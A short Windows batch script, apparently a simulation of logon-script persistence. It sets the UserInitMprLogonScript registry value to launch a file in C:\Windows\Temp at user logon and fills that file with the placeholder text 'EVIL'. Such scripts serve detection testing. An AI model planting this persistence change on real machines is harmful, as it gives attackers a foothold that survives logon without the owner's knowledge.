@echo off
reg add HKCU\Environment /v "UserInitMprLogonScript" /t REG_SZ /f /d "C:\Windows\Temp\evil.dll"
echo "EVIL" >> C:\Windows\Temp\evil.dll